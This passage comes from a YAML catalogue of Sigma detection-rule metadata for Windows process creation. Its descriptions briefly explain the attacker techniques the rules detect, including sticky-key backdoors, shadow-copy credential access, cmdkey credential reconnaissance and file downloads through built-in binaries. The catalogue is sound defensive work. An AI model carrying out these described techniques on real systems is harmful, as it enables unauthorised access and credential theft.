  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_cmd_del_execution.yml
  name: File Deletion Via Del
  description: 'Detects execution of the builtin "del"/"erase" commands in order to
    delete files.

    Adversaries may delete files left behind by the actions of their intrusion activity.

    Malware, tools, or other non-native files dropped or created on a system by an
    adversary may leave traces to indicate to what was done within a network and how.

    Removal of these files can occur during an intrusion, or as part of a post-intrusion
    process to minimize the adversary''s footprint.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1070.004
  tags:
  - attack.defense-evasion
  - attack.t1070.004
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1070.004/T1070.004.md
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/erase
  false_positives:
  - False positives levels will differ Depending on the environment. You can use a
    combination of ParentImage and other keywords from the CommandLine field to filter
    legitimate activity
  notes: ''
- detection_id: 204b17ae-4007-471b-917b-b917b315c5db
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_cmd_del_greedy_deletion.yml
  name: Greedy File Deletion Using Del
  description: Detects execution of the "del" builtin command to remove files using
    greedy/wildcard expression. This is often used by malware to delete content of
    folders that perhaps contains the initial malware infection or to delete evidence.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1070.004
  tags:
  - attack.defense-evasion
  - attack.t1070.004
  time_window: ''
  references:
  - https://www.joesandbox.com/analysis/509330/0/html#1044F3BDBE3BB6F734E357235F4D5898582D
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/erase
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7c9340a9-e2ee-4e43-94c5-c54ebbea1006
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_cmd_dir_execution.yml
  name: File And SubFolder Enumeration Via Dir Command
  description: 'Detects usage of the "dir" command part of Windows CMD with the "/S"
    command line flag in order to enumerate files in a specified directory and all
    subdirectories.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Discovery
  techniques:
  - T1217
  tags:
  - attack.discovery
  - attack.t1217
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1217/T1217.md
  false_positives:
  - Likely
  notes: ''
- detection_id: a77c1610-fc73-4019-8e29-0f51efc04a51
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_cmd_dosfuscation.yml
  name: Potential Dosfuscation Activity
  description: Detects possible payload obfuscation via the commandline
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://www.fireeye.com/content/dam/fireeye-www/blog/pdfs/dosfuscation-report.pdf
  - https://github.com/danielbohannon/Invoke-DOSfuscation
  false_positives:
  - Unknown
  notes: ''
- detection_id: 1ac8666b-046f-4201-8aba-1951aaec03a3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_cmd_http_appdata.yml
  name: Command Line Execution with Suspicious URL and AppData Strings
  description: Detects a suspicious command line execution that includes an URL and
    AppData string in the command line parameters as used by several droppers (js/vbs
    > powershell)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  - T1059.003
  - T1105
  tags:
  - attack.execution
  - attack.command-and-control
  - attack.t1059.003
  - attack.t1059.001
  - attack.t1105
  time_window: ''
  references:
  - https://www.hybrid-analysis.com/sample/3a1f01206684410dbe8f1900bbeaaa543adfcd07368ba646b499fa5274b9edf6?environmentId=100
  - https://www.hybrid-analysis.com/sample/f16c729aad5c74f19784a24257236a8bbe27f7cdc4a89806031ec7f1bebbd475?environmentId=100
  false_positives:
  - High
  notes: ''
- detection_id: e9b61244-893f-427c-b287-3e708f321c6b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_cmd_mklink_osk_cmd.yml
  name: Potential Privilege Escalation Using Symlink Between Osk and Cmd
  description: Detects the creation of a symbolic link between "cmd.exe" and the accessibility
    on-screen keyboard binary (osk.exe) using "mklink". This technique provides an
    elevated command prompt to the user from the login screen without the need to
    log in.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.008
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1546.008
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/5c1e6f1b4fafd01c8d1ece85f510160fc1275fbf/atomics/T1546.008/T1546.008.md
  - https://ss64.com/nt/mklink.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: 40b19fa6-d835-400c-b301-41f3a2baacaf
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_cmd_mklink_shadow_copies_access_symlink.yml
  name: VolumeShadowCopy Symlink Creation Via Mklink
  description: Shadow Copies storage symbolic link creation using operating systems
    utilities
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: stable
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.002
  - T1003.003
  tags:
  - attack.credential-access
  - attack.t1003.002
  - attack.t1003.003
  time_window: ''
  references:
  - https://www.slideshare.net/heirhabarov/hunting-for-credentials-dumping-in-windows-environment
  false_positives:
  - Legitimate administrator working with shadow copies, access for backup purposes
  notes: ''
- detection_id: f0507c0f-a3a2-40f5-acc6-7f543c334993
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_cmd_net_use_and_exec_combo.yml
  name: Suspicious File Execution From Internet Hosted WebDav Share
  description: Detects the execution of the "net use" command to mount a WebDAV server
    and then immediately execute some content in it. As seen being used in malicious
    LNK files
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://twitter.com/ShadowChasing1/status/1552595370961944576
  - https://www.virustotal.com/gui/file/a63376ee1dba76361df73338928e528ca5b20171ea74c24581605366dcaa0104/behavior
  false_positives:
  - Unknown
  notes: ''
- detection_id: a16980c2-0c56-4de0-9a79-17971979efdd
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_cmd_no_space_execution.yml
  name: Cmd.EXE Missing Space Characters Execution Anomaly
  description: 'Detects Windows command lines that miss a space before or after the
    /c flag when running a command using the cmd.exe.

    This could be a sign of obfuscation of a fat finger problem (typo by the developer).

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - baseline_or_anomaly_framing
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  tags:
  - attack.execution
  - attack.t1059.001
  time_window: ''
  references:
  - https://twitter.com/cyb3rops/status/1562072617552678912
  - https://ss64.com/nt/cmd.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: bbc865e4-7fcd-45a6-8ff1-95ced28ec5b2
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_cmd_ntdllpipe_redirect.yml
  name: NtdllPipe Like Activity Execution
  description: Detects command that type the content of ntdll.dll to a different file
    or a pipe in order to evade AV / EDR detection. As seen being used in the POC
    NtdllPipe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques: []
  tags:
  - attack.defense-evasion
  time_window: ''
  references:
  - https://web.archive.org/web/20220306121156/https://www.x86matthew.com/view_post?id=ntdll_pipe
  false_positives:
  - Unknown
  notes: ''
- detection_id: 087790e3-3287-436c-bccf-cbd0184a7db1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_cmd_path_traversal.yml
  name: Potential CommandLine Path Traversal Via Cmd.EXE
  description: Detects potential path traversal attempt via cmd.exe. Could indicate
    possible command/argument confusion/hijacking
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.003
  tags:
  - attack.execution
  - attack.t1059.003
  time_window: ''
  references:
  - https://hackingiscool.pl/cmdhijack-command-argument-confusion-with-path-traversal-in-cmd-exe/
  - https://twitter.com/Oddvarmoe/status/1270633613449723905
  false_positives:
  - Java tools are known to produce false-positive when loading libraries
  notes: ''
- detection_id: ded2b07a-d12f-4284-9b76-653e37b6c8b0
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_cmd_ping_copy_combined_execution.yml
  name: Potentially Suspicious Ping/Copy Command Combination
  description: 'Detects uncommon and potentially suspicious one-liner command containing
    both "ping" and "copy" at the same time, which is usually used by malware.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1070.004
  tags:
  - attack.defense-evasion
  - attack.t1070.004
  time_window: ''
  references:
  - Internal Research
  false_positives:
  - Unknown
  notes: ''
- detection_id: 54786ddc-5b8a-11ed-9b6a-0242ac120002
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_cmd_ping_del_combined_execution.yml
  name: Suspicious Ping/Del Command Combination
  description: Detects a method often used by ransomware. Which combines the "ping"
    to wait a couple of seconds and then "del" to delete the file in question. Its
    used to hide the file responsible for the initial infection for example
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1070.004
  tags:
  - attack.defense-evasion
  - attack.t1070.004
  time_window: ''
  references:
  - https://blog.sygnia.co/kaseya-ransomware-supply-chain-attack
  - https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2022/06/23093553/Common-TTPs-of-the-modern-ransomware_low-res.pdf
  - https://www.acronis.com/en-us/blog/posts/lockbit-ransomware/
  - https://symantec-enterprise-blogs.security.com/blogs/threat-intelligence/blackbyte-exbyte-ransomware
  false_positives:
  - Unknown
  notes: ''
- detection_id: 8e0bb260-d4b2-4fff-bb8d-3f82118e6892
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_cmd_redirection_susp_folder.yml
  name: Potentially Suspicious CMD Shell Output Redirect
  description: 'Detects inline Windows shell commands redirecting output via the ">"
    symbol to a suspicious location.

    This technique is sometimes used by malicious actors in order to redirect the
    output of reconnaissance commands such as "hostname" and "dir" to files for future
    exfiltration.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1218
  tags:
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://thedfirreport.com/2022/07/11/select-xmrig-from-sqlserver/
  false_positives:
  - Legitimate admin or third party scripts used for diagnostic collection might generate
    some false positives
  notes: ''
- detection_id: 41ca393d-538c-408a-ac27-cf1e038be80c
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_cmd_rmdir_execution.yml
  name: Directory Removal Via Rmdir
  description: 'Detects execution of the builtin "rmdir" command in order to delete
    directories.

    Adversaries may delete files left behind by the actions of their intrusion activity.

    Malware, tools, or other non-native files dropped or created on a system by an
    adversary may leave traces to indicate to what was done within a network and how.

    Removal of these files can occur during an intrusion, or as part of a post-intrusion
    process to minimize the adversary''s footprint.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: low
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1070.004
  tags:
  - attack.defense-evasion
  - attack.t1070.004
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1070.004/T1070.004.md
  - https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/erase
  false_positives:
  - Unknown
  notes: ''
- detection_id: c73124a7-3e89-44a3-bdc1-25fe4df754b1
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_cmd_shadowcopy_access.yml
  name: Copy From VolumeShadowCopy Via Cmd.EXE
  description: Detects the execution of the builtin "copy" command that targets a
    shadow copy (sometimes used to copy registry hives that are in use)
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Impact
  techniques:
  - T1490
  tags:
  - attack.impact
  - attack.t1490
  time_window: ''
  references:
  - https://twitter.com/vxunderground/status/1423336151860002816?s=20
  - https://www.virustotal.com/gui/file/03e9b8c2e86d6db450e5eceec057d7e369ee2389b9daecaf06331a95410aa5f8/detection
  - https://pentestlab.blog/2018/07/04/dumping-domain-password-hashes/
  false_positives:
  - Backup scenarios using the commandline
  notes: ''
- detection_id: 241e802a-b65e-484f-88cd-c2dc10f9206d
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_cmd_stdin_redirect.yml
  name: Read Contents From Stdin Via Cmd.EXE
  description: Detect the use of "<" to read and potentially execute a file via cmd.exe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.003
  tags:
  - attack.execution
  - attack.t1059.003
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/40b77d63808dd4f4eafb83949805636735a1fd15/atomics/T1059.003/T1059.003.md
  - https://web.archive.org/web/20220306121156/https://www.x86matthew.com/view_post?id=ntdll_pipe
  false_positives:
  - Unknown
  notes: ''
- detection_id: 2fdefcb3-dbda-401e-ae23-f0db027628bc
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_cmd_sticky_key_like_backdoor_execution.yml
  name: Sticky Key Like Backdoor Execution
  description: Detects the usage and installation of a backdoor that uses an option
    to register a malicious debugger for built-in tools that are accessible in the
    login screen
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.008
  tags:
  - attack.privilege-escalation
  - attack.persistence
  - attack.t1546.008
  - car.2014-11-003
  - car.2014-11-008
  time_window: ''
  references:
  - https://learn.microsoft.com/en-us/archive/blogs/jonathantrull/detecting-sticky-key-backdoors
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 1070db9a-3e5d-412e-8e7b-7183b616e1b3
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_cmd_sticky_keys_replace.yml
  name: Persistence Via Sticky Key Backdoor
  description: 'By replacing the sticky keys executable with the local admins CMD
    executable, an attacker is able to access a privileged windows console session
    without authenticating to the system.

    When the sticky keys are "activated" the privilleged shell is launched.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: critical
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Persistence
  techniques:
  - T1546.008
  tags:
  - attack.persistence
  - attack.t1546.008
  - attack.privilege-escalation
  time_window: ''
  references:
  - https://www.fireeye.com/blog/threat-research/2017/03/apt29_domain_frontin.html
  - https://www.clearskysec.com/wp-content/uploads/2020/02/ClearSky-Fox-Kitten-Campaign-v1.pdf
  - https://learn.microsoft.com/en-us/archive/blogs/jonathantrull/detecting-sticky-key-backdoors
  false_positives:
  - Unlikely
  notes: ''
- detection_id: aa0b3a82-eacc-4ec3-9150-b5a9a3e3f82f
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_cmd_type_arbitrary_file_download.yml
  name: Potential Download/Upload Activity Using Type Command
  description: Detects usage of the "type" command to download/upload data from WebDAV
    server
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1105
  tags:
  - attack.command-and-control
  - attack.t1105
  time_window: ''
  references:
  - https://mr0range.com/a-new-lolbin-using-the-windows-type-command-to-upload-download-files-81d7b6179e22
  false_positives:
  - Unknown
  notes: ''
- detection_id: 4b991083-3d0e-44ce-8fc4-b254025d8d4b
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_cmd_unusual_parent.yml
  name: Unusual Parent Process For Cmd.EXE
  description: Detects suspicious parent process for cmd.exe
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 6
  predictive_readiness_factors:
  - sequence_or_progression_logic
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059
  tags:
  - attack.execution
  - attack.t1059
  time_window: ''
  references:
  - https://www.elastic.co/guide/en/security/current/unusual-parent-process-for-cmd.exe.html
  false_positives:
  - Unknown
  notes: ''
- detection_id: b1ec66c6-f4d1-4b5c-96dd-af28ccae7727
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_cmdkey_adding_generic_creds.yml
  name: New Generic Credentials Added Via Cmdkey.EXE
  description: 'Detects usage of "cmdkey.exe" to add generic credentials.

    As an example, this can be used before connecting to an RDP session via command
    line interface.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: predictive_adjacent
  predictive_readiness_score: 5
  predictive_readiness_factors:
  - time_window_aggregation
  - distinct_or_novel_entity_logic
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.005
  tags:
  - attack.credential-access
  - attack.t1003.005
  time_window: ''
  references:
  - https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1021.001/T1021.001.md#t1021001---remote-desktop-protocol
  false_positives:
  - Legitimate usage for administration purposes
  notes: ''
- detection_id: 07f8bdc2-c9b3-472a-9817-5a670b872f53
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_cmdkey_recon.yml
  name: Potential Reconnaissance For Cached Credentials Via Cmdkey.EXE
  description: Detects usage of cmdkey to look for cached credentials on the system
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1003.005
  tags:
  - attack.credential-access
  - attack.t1003.005
  time_window: ''
  references:
  - https://www.peew.pw/blog/2017/11/26/exploring-cmdkey-an-edge-case-for-privilege-escalation
  - https://technet.microsoft.com/en-us/library/cc754243(v=ws.11).aspx
  - https://github.com/redcanaryco/atomic-red-team/blob/b27a3cb25025161d49ac861cb216db68c46a3537/atomics/T1003.005/T1003.005.md#atomic-test-1---cached-credential-dump-via-cmdkey
  false_positives:
  - Legitimate administrative tasks
  notes: ''
- detection_id: f37aba28-a9e6-4045-882c-d5004043b337
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_cmdl32_arbitrary_file_download.yml
  name: Potential Arbitrary File Download Via Cmdl32.EXE
  description: 'Detects execution of Cmdl32 with the "/vpn" and "/lan" flags.

    Attackers can abuse this utility in order to download arbitrary files via a configuration
    file.

    Inspect the location and the content of the file passed as an argument in order
    to determine if it is suspicious.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1202
  - T1218
  tags:
  - attack.execution
  - attack.defense-evasion
  - attack.t1218
  - attack.t1202
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/Cmdl32/
  - https://twitter.com/SwiftOnSecurity/status/1455897435063074824
  - https://github.com/LOLBAS-Project/LOLBAS/pull/151
  false_positives:
  - Unknown
  notes: ''
- detection_id: 7d4cdc5a-0076-40ca-aac8-f7e714570e47
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_cmstp_execution_by_creation.yml
  name: CMSTP Execution Process Creation
  description: Detects various indicators of Microsoft Connection Manager Profile
    Installer execution
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: stable
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1218.003
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.t1218.003
  - attack.g0069
  - car.2019-04-001
  time_window: ''
  references:
  - https://web.archive.org/web/20190720093911/http://www.endurant.io/cmstp/detecting-cmstp-enabled-code-execution-and-uac-bypass-with-sysmon/
  false_positives:
  - Legitimate CMSTP use (unlikely in modern enterprise environments)
  notes: ''
- detection_id: 1f0f6176-6482-4027-b151-00071af39d7e
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_configsecuritypolicy_download_file.yml
  name: Arbitrary File Download Via ConfigSecurityPolicy.EXE
  description: 'Detects the execution of "ConfigSecurityPolicy.EXE", a binary part
    of Windows Defender used to manage settings in Windows Defender.

    Users can configure different pilot collections for each of the co-management
    workloads.

    It can be abused by attackers in order to upload or download files.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Exfiltration
  techniques:
  - T1567
  tags:
  - attack.exfiltration
  - attack.t1567
  time_window: ''
  references:
  - https://lolbas-project.github.io/lolbas/Binaries/ConfigSecurityPolicy/
  false_positives:
  - Unknown
  notes: ''
- detection_id: 056c7317-9a09-4bd4-9067-d051312752ea
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_conhost_headless_powershell.yml
  name: Powershell Executed From Headless ConHost Process
  description: 'Detects the use of powershell commands from headless ConHost window.

    The "--headless" flag hides the windows from the user upon execution.

    '
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.001
  - T1059.003
  - T1564.003
  tags:
  - attack.defense-evasion
  - attack.execution
  - attack.t1059.001
  - attack.t1059.003
  - attack.t1564.003
  time_window: ''
  references:
  - https://www.huntress.com/blog/fake-browser-updates-lead-to-boinc-volunteer-computing-software
  false_positives:
  - Unknown
  notes: ''
- detection_id: 3037d961-21e9-4732-b27a-637bcc7bf539
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_conhost_legacy_option.yml
  name: Suspicious High IntegrityLevel Conhost Legacy Option
  description: ForceV1 asks for information directly from the kernel space. Conhost
    connects to the console application. High IntegrityLevel means the process is
    running with elevated privileges, such as an Administrator context.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: informational
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1202
  tags:
  - attack.defense-evasion
  - attack.t1202
  time_window: ''
  references:
  - https://cybercryptosec.medium.com/covid-19-cyber-infection-c615ead7c29
  - https://thedfirreport.com/2022/04/04/stolen-images-campaign-ends-in-conti-ransomware/
  - https://learn.microsoft.com/en-us/windows/win32/secauthz/mandatory-integrity-control
  false_positives:
  - Very Likely, including launching cmd.exe via Run As Administrator
  notes: ''
- detection_id: ee5e119b-1f75-4b34-add8-3be976961e39
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_conhost_path_traversal.yml
  name: Conhost.exe CommandLine Path Traversal
  description: detects the usage of path traversal in conhost.exe indicating possible
    command/argument confusion/hijacking
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics:
  - Execution
  techniques:
  - T1059.003
  tags:
  - attack.execution
  - attack.t1059.003
  time_window: ''
  references:
  - https://pentestlab.blog/2020/07/06/indirect-command-execution/
  false_positives:
  - Unlikely
  notes: ''
- detection_id: 7dc2dedd-7603-461a-bc13-15803d132355
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_conhost_susp_child_process.yml
  name: Uncommon Child Process Of Conhost.EXE
  description: Detects uncommon "conhost" child processes. This could be a sign of
    "conhost" usage as a LOLBIN or potential process injection activity.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: medium
  status: test
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1202
  tags:
  - attack.defense-evasion
  - attack.t1202
  time_window: ''
  references:
  - http://www.hexacorn.com/blog/2020/05/25/how-to-con-your-host/
  false_positives:
  - Unknown
  notes: ''
- detection_id: dfa03a09-8b92-4d83-8e74-f72839b1c407
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_conhost_susp_winshell_child_process.yml
  name: Potentially Suspicious Child Processes Spawned by ConHost
  description: Detects suspicious child processes related to Windows Shell utilities
    spawned by `conhost.exe`, which could indicate malicious activity using trusted
    system components.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
  predictive_readiness_score: 2
  predictive_readiness_factors:
  - time_window_aggregation
  severity: high
  status: experimental
  platform: windows
  product: windows
  category: process_creation
  data_sources: []
  tactics: []
  techniques:
  - T1202
  - T1218
  tags:
  - attack.t1202
  - attack.defense-evasion
  - attack.t1218
  time_window: ''
  references:
  - https://tria.ge/241015-l98snsyeje/behavioral2
  false_positives:
  - Legitimate administrative tasks using `conhost.exe` to spawn child processes such
    as `cmd.exe`, `powershell.exe`, or `regsvr32.exe`.
  notes: ''
- detection_id: cbb9e3d1-2386-4e59-912e-62f1484f7a89
  source_id: sigmahq_sigma
  source_rule_path: external/sigma/rules/windows/process_creation/proc_creation_win_conhost_uncommon_parent.yml
  name: Conhost Spawned By Uncommon Parent Process
  description: Detects when the Console Window Host (conhost.exe) process is spawned
    by an uncommon parent process, which could be indicative of potential code injection
    activity.
  query_language: sigma
  detection_type: reactive
  predictive_readiness: reactive_only
